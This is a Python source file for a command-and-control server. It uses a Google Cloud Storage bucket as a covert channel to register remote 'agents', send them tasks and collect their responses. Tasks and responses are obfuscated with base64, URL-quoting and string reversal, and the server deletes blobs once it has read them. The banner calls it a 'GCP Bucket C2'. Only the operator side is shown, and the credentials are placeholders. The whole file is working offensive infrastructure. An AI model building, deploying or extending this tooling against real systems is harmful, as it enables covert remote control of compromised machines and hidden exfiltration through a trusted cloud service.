from google.cloud import storage
from google.oauth2 import service_account
from google.cloud.storage.bucket import Bucket
from google.cloud.storage.blob import Blob
from google.cloud.storage.client import Client 
from google.api_core.exceptions import NotFound
import base64
import urllib.parse
import uuid
from time import sleep
import json
import cmd
import threading
from tabulate import tabulate
import time
from colorama import init, Fore, Style

init(autoreset=True)

class GCPAdminServer(cmd.Cmd):
    prompt = f'{Fore.CYAN}GCP Shell> {Style.RESET_ALL}'

    def __init__(self, bucket_name, credentials):
        super().__init__()
        self.bucket_name = bucket_name
        self.client = Client(credentials=credentials)
        self.bucket = Bucket(self.client, name=bucket_name)
        self.agents = {}
        self.stop_flag = threading.Event()
        self.agent_check_thread = threading.Thread(target=self.periodic_agent_check)
        self.agent_check_thread.start()
        self.inactive_threshold = 20  # seconds, adjust as needed

    def encode(self, data):
        data = base64.b64encode(data.encode()).decode()
        return urllib.parse.quote_plus(data)[::-1]

    def decode(self, data):
        data = urllib.parse.unquote(data[::-1])
        return base64.b64decode(data).decode()

    def send_task(self, agent_id, task):
        task_key = f"{agent_id}:TaskForYou:{str(uuid.uuid4())}"
        blob = self.bucket.blob(task_key)
        blob.upload_from_string(self.encode(task))
        print(f'Sent task to agent {agent_id[:8]}')

    def recv_response(self, agent_id):
        prefix = f"{agent_id}:RespForYou"
        blobs = list(self.bucket.list_blobs(prefix=prefix))
        responses = []
        for blob in blobs:
            response = self.decode(blob.download_as_text())
            responses.append(response)
            blob.delete()
        return responses

    def check_for_agents(self):
        prefix = "AGENT:"
        blobs = list(self.bucket.list_blobs(prefix=prefix))
        current_time = time.time()
        active_agents = set()
        new_agents = []

        for blob in blobs:
            full_agent_id = blob.name.split(':')[1]
            truncated_agent_id = full_agent_id[:8]
            active_agents.add(truncated_agent_id)
            
            if truncated_agent_id not in self.agents:
                self.agents[truncated_agent_id] = {
                    'status': 'active',
                    'full_id': full_agent_id,
                    'last_check_in': current_time
                }
                new_agents.append(truncated_agent_id)
            else:
                self.agents[truncated_agent_id]['last_check_in'] = current_time
                self.agents[truncated_agent_id]['status'] = 'active'
            
            try:
                blob.delete()
            except NotFound:
                # Object was already deleted, ignore this error
                pass
        
        # Mark agents as inactive if they're not in the active set
        for agent_id in self.agents:
            if agent_id not in active_agents:
                if current_time - self.agents[agent_id]['last_check_in'] > self.inactive_threshold:
                    self.agents[agent_id]['status'] = 'inactive'
        
        return new_agents

    def update_agent_status(self):
        current_time = time.time()
        for agent_id, info in self.agents.items():
            if current_time - info['last_check_in'] > self.inactive_threshold:
                info['status'] = 'inactive'

    def periodic_agent_check(self):
        while not self.stop_flag.is_set():
            new_agents = self.check_for_agents()
            for agent_id in new_agents:
                print(f"\n{Fore.GREEN}[+] New agent registered: {agent_id}{Style.RESET_ALL}")
                print(f"{self.prompt}", end='', flush=True)
            sleep(5)  # Check every 5 seconds

    def do_remove_agent(self, arg):
        """Remove an agent from the list. Usage: remove_agent <agent_id>"""
        if not arg:
            print(f"{Fore.YELLOW}Usage: remove_agent <agent_id>{Style.RESET_ALL}")
            return

        agent_id = self.find_agent_id(arg)
        if agent_id:
            del self.agents[agent_id]
            print(f"{Fore.GREEN}Agent {agent_id} has been removed from the list.{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}No agent found with ID {arg}.{Style.RESET_ALL}")

    def find_agent_id(self, partial_id):
        matching_agents = [aid for aid in self.agents.keys() if aid.startswith(partial_id)]
        if len(matching_agents) == 1:
            return matching_agents[0]
        elif len(matching_agents) > 1:
            print(f"{Fore.YELLOW}Multiple agents match '{partial_id}': {', '.join(matching_agents)}{Style.RESET_ALL}")
            return None
        else:
            print(f"{Fore.RED}No agent found matching '{partial_id}'{Style.RESET_ALL}")
            return None

    def do_list_agents(self, arg):
        """List all registered agents in a formatted table"""
        if not self.agents:
            print("No agents registered")
        else:
            headers = ["Agent ID", "Status", "Last Check-in", "Full ID"]
            current_time = time.time()
            table_data = [
                [
                    agent_id,
                    f"{Fore.GREEN}active{Style.RESET_ALL}" if info['status'] == 'active' else f"{Fore.RED}inactive{Style.RESET_ALL}",
                    f"{int(current_time - info['last_check_in'])}s ago",
                    info['full_id']
                ]
                for agent_id, info in self.agents.items()
            ]
            print("\nRegistered Agents:")
            print(tabulate(table_data, headers=headers, tablefmt="grid"))

    def do_send_task(self, arg):
        """Send a task to an agent. Usage: send_task <agent_id> <task>"""
        args = arg.split(maxsplit=1)
        if len(args) != 2:
            print("Usage: send_task <agent_id> <task>")
            return
        partial_agent_id, task = args
        agent_id = self.find_agent_id(partial_agent_id)
        if not agent_id:
            return
        self.send_task(self.agents[agent_id]['full_id'], task)

    def do_get_responses(self, arg):
        """Get responses from an agent. Usage: get_responses <agent_id>"""
        if not arg:
            print("Usage: get_responses <agent_id>")
            return
        agent_id = self.find_agent_id(arg)
        if not agent_id:
            return
        responses = self.recv_response(self.agents[agent_id]['full_id'])
        if responses:
            for response in responses:
                print(f"Response from {agent_id}: {response}")
        else:
            print(f"No responses from {agent_id}")

    def do_exit(self, arg):
        """Exit the server"""
        print("Exiting...")
        self.stop_flag.set()
        self.agent_check_thread.join()
        return True

    def do_help(self, arg):
        """List available commands with "help" or detailed help with "help cmd"."""
        super().do_help(arg)

if __name__ == "__main__":
    # Insert the JSON output from Service Account Key Creation
    info = {
      "type": "service_account",
      "project_id": "<YOUR PROJECT>",
      "private_key_id": "<PRIVATE KEY ID>",
      "private_key": "<PRIVATE KEY OF SERVICE ACCOUNT>",
      "client_email": "<SERVICE_ACCOUNT_EMAIL>",
      "client_id": "<CLIENT ID HERE>",
      "auth_uri": "https://accounts.google.com/o/oauth2/auth",
      "token_uri": "https://oauth2.googleapis.com/token",
      "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
      "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/<SERVICE_ACCOUNT_EMAIL>",
      "universe_domain": "googleapis.com"
    }

    credentials = service_account.Credentials.from_service_account_info(info)
    bucket_name = '<YOUR BUCKET NAME>'

    server = GCPAdminServer(bucket_name, credentials)
    server.cmdloop(f"GCP Bucket C2 ready. Type '{Fore.GREEN}help{Style.RESET_ALL}' for commands.")